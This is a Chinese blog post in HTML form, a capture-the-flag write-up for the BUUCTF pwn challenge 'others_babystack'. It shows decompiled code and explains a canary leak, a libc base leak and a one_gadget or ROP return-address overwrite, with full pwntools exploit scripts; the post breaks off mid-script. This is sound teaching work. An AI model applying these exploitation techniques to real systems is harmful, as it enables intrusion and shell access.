@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="一道蛮神奇的题 两种解法 不过一种有点非常规 不知道出题人怎么设置的 checksec看一下保护机制 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &amp;#x27;&#x2F;home&#x2F;chen&#x2F;pwn&amp;#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO">
+<meta property="og:type" content="article">
+<meta property="og:title" content="others_babystack">
+<meta property="og:url" content="http://example.com/2022/12/16/others-babystack/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="一道蛮神奇的题 两种解法 不过一种有点非常规 不知道出题人怎么设置的 checksec看一下保护机制 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &amp;#x27;&#x2F;home&#x2F;chen&#x2F;pwn&amp;#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic.imgdb.cn/item/639c6c9fb1fccdcd36ad97f4.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/639c6e8eb1fccdcd36b17088.png">
+<meta property="article:published_time" content="2022-12-16T12:43:10.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:20:14.312Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/639c6c9fb1fccdcd36ad97f4.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>others_babystack</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/12/18/gyctf-2020-borrowstack/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/12/14/%E8%AE%A1%E7%BB%84%E5%8E%9F%E7%90%86/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/12/16/others-babystack/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/12/16/others-babystack/&text=others_babystack"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/12/16/others-babystack/&title=others_babystack"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/12/16/others-babystack/&is_video=false&description=others_babystack"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=others_babystack&body=Check out this article: http://example.com/2022/12/16/others-babystack/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/12/16/others-babystack/&title=others_babystack"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/12/16/others-babystack/&title=others_babystack"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/12/16/others-babystack/&title=others_babystack"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/12/16/others-babystack/&title=others_babystack"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/12/16/others-babystack/&name=others_babystack&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/12/16/others-babystack/&t=others_babystack"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        others_babystack
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-12-16T12:43:10.000Z" class="dt-published" itemprop="datePublished">2022-12-16</time>
+        
+        (Updated: <time datetime="2023-09-14T17:20:14.312Z" class="dt-updated" itemprop="dateModified">2023-09-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/wp/">wp</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>一道蛮神奇的题 两种解法 不过一种有点非常规 不知道出题人怎么设置的</p>
+<p>checksec看一下保护机制</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>ida查看一下main函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = choice();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        read(<span class="number">0</span>, s, <span class="number">0x100</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sendline(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sendline(&amp;unk_400AE7);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>menu函数这里就不放了 反正就看这些源码也能知道各个选项对应什么作用</p>
+<p>两个比较重要的地方 有一个puts泄露的机会 还有read函数可以读入数据</p>
+<p>考虑到程序开启了金丝雀 所以这里的puts可以用来泄露金丝雀</p>
+<p>覆盖金丝雀的最后一位 使其不为\x00 因为puts或者printf截停一个字符串就是靠\x00</p>
+<p>这里泄露的时候有个小坑 就是你不能想着读入后7位 然后最后用p64把他补全成八位 因为第八位也恒为00嘛</p>
+<p>但是pwntools的p64补全是在首位补全</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./a.out&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">canary = <span class="number">0x11223344556677</span></span><br><span class="line">payload = p64(canary)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>如上程序 假设canary值为上述那样 我们debug看一下最后会输送什么样的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    00000000  77 66 55 44  33 22 11 00  0a                        │wfUD│3&quot;··│·│</span><br><span class="line">    00000009</span><br></pre></td></tr></table></figure>
+
+<p>很明显 小端序存储 所以00实际上是被放在了首位</p>
+<p>所以可以用sendline多出来的\n字节覆盖\x00 然后接收八个字节的数据 最后-0xa 就能得到带有00的canary</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libcmath</span>(<span class="params">function_addr,function_name</span>):</span><br><span class="line">    libc_addr = function_addr - libc.sym[function_name]</span><br><span class="line">    system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> system_addr,binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr</span>):</span><br><span class="line">    payload = cyclic(offset)</span><br><span class="line">    payload += p64(gadget2_addr)</span><br><span class="line">    payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(gadget1_addr)</span><br><span class="line">    payload += cyclic(<span class="number">56</span>)</span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">localconnect</span>(<span class="params">filename</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remoteconnect</span>(<span class="params">ip,port</span>):</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">elf_libc</span>(<span class="params">filename,libc_name</span>):</span><br><span class="line">    elf = ELF(filename)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    <span class="keyword">return</span> elf,libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">button</span>):</span><br><span class="line">    <span class="keyword">if</span>(button==<span class="number">1</span>):</span><br><span class="line">        context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;buu_libc_ubuntu16_64&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">29125</span></span><br><span class="line">elf,libc = elf_libc(filename,libc_name)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line">main_addr = <span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line">io = remoteconnect(ip,port)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">debug(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x400690</span></span><br><span class="line">rdi_addr = <span class="number">0x400a93</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leave_addr = <span class="number">0x400824</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x87</span>)+<span class="string">b&quot;1&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0xa</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来还要想办法控制程序执行流 一开始看到read只能读入0x100的数据 我是觉得不能构造rop链来泄露libc基址</p>
+<p>但是最后查看wp的时候 发现大家都是用泄露基址的办法做的 也是比较神奇 数据竟然能超出限制读入</p>
+<p>第一种办法用到的是泄露__libc_start_main函数的地址</p>
+<p>稍微了解一下程序函数调用就会知道 main函数并不是程序第一个调用的</p>
+<p>__libc_start_main函数的地址应该是在rbp的下一个字长处</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x98</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recv(<span class="number">0x98</span>)</span><br><span class="line">start_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = start_addr - <span class="number">240</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure>
+
+<p>这里泄露出来的start_addr之所以要减去240 还得要动调来看</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/639c6c9fb1fccdcd36ad97f4.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/639c6c9fb1fccdcd36ad97f4.png"></a></p>
+<p>泄露出来的地址距离__libc_start_main函数还有231偏移 当然这只是本地libc的偏移 远程的等下还得微调一下</p>
+<p>此时我们得到算式:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc_addr = start_addr - 231 - libc.sym[&#x27;__libc_start_main&#x27;]</span><br></pre></td></tr></table></figure>
+
+<p>在本地上 其后三位是000 但是远程环境不同 运行看一下差了多少</p>
+<p>得到的值是0x7f3fea3e8009 多了9 那就减去240就可以得到远程的libc基址了</p>
+<p>虽然我们得到了libc基址 但是由于read可以溢出的长度不够我们构造一个system链 所以这里采取修改ret addr为one_gadget</p>
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libcmath</span>(<span class="params">function_addr,function_name</span>):</span><br><span class="line">    libc_addr = function_addr - libc.sym[function_name]</span><br><span class="line">    system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> system_addr,binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr</span>):</span><br><span class="line">    payload = cyclic(offset)</span><br><span class="line">    payload += p64(gadget2_addr)</span><br><span class="line">    payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(gadget1_addr)</span><br><span class="line">    payload += cyclic(<span class="number">56</span>)</span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">localconnect</span>(<span class="params">filename</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remoteconnect</span>(<span class="params">ip,port</span>):</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">elf_libc</span>(<span class="params">filename,libc_name</span>):</span><br><span class="line">    elf = ELF(filename)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    <span class="keyword">return</span> elf,libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">button</span>):</span><br><span class="line">    <span class="keyword">if</span>(button==<span class="number">1</span>):</span><br><span class="line">        context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;buu_libc_ubuntu16_64&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">29125</span></span><br><span class="line">elf,libc = elf_libc(filename,libc_name)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line">main_addr = <span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line">io = remoteconnect(ip,port)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">debug(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x400690</span></span><br><span class="line">rdi_addr = <span class="number">0x400a93</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leave_addr = <span class="number">0x400824</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x87</span>)+<span class="string">b&quot;1&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0xa</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x98</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recv(<span class="number">0x98</span>)</span><br><span class="line">start_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = start_addr - <span class="number">240</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="comment">#0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x88</span>+p64(canary)+p64(<span class="number">0xabcdabcd</span>)+p64(onegadget_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.send(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>不过这题不知道为啥 read函数虽然对输入的数据进行了限制 但是好像还是可以超额输入 原理暂时还不清楚 留个坑</p>
+<p>所以这题可以用构造rop链 泄露libc基址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27865)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露canary</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x400a93</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=<span class="number">0x400690</span></span><br><span class="line">main_addr=<span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(canary)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>payload总长明显是超过0x100的 但是gdb动调看了一下 确实是能写进去的</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/639c6e8eb1fccdcd36b17088.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/639c6e8eb1fccdcd36b17088.png"></a></p>
+<p>你直接打断点是看不到这些栈的内容的 这一段在高地址处 因为是之前执行过的栈</p>
+<p>所以你需要用 set $rsp &#x3D; $rsp - 0x68来调整一下rsp寄存器的位置 因为stack是以sp寄存器为0来延申的</p>
+<p>这里还有一点是要注意的 此时我们一直是在while循环中 在执行完一连串的指令后 并不会跳转到返回地址 因为这并不属于一个栈帧的结束 从栈上的地址逐渐降低也可以看出来 所以我们需要手动退出while循环</p>
+<p>剩下的就没什么好说的了 完整exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#p=remote(&#x27;node4.buuoj.cn&#x27;,27865)</span><br><span class="line">p=process(&#x27;./pwn&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">#泄露canary</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)</span><br><span class="line">payload=&#x27;a&#x27;*(0x80+8)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)</span><br><span class="line">p.recvuntil(&#x27;a\n&#x27;)</span><br><span class="line">canary=u64(p.recv(7).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">pop_rdi=0x400a93</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt=0x400690</span><br><span class="line">main_addr=0x400908</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x80+8)+p64(canary)+p64(0)</span><br><span class="line">payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)</span><br><span 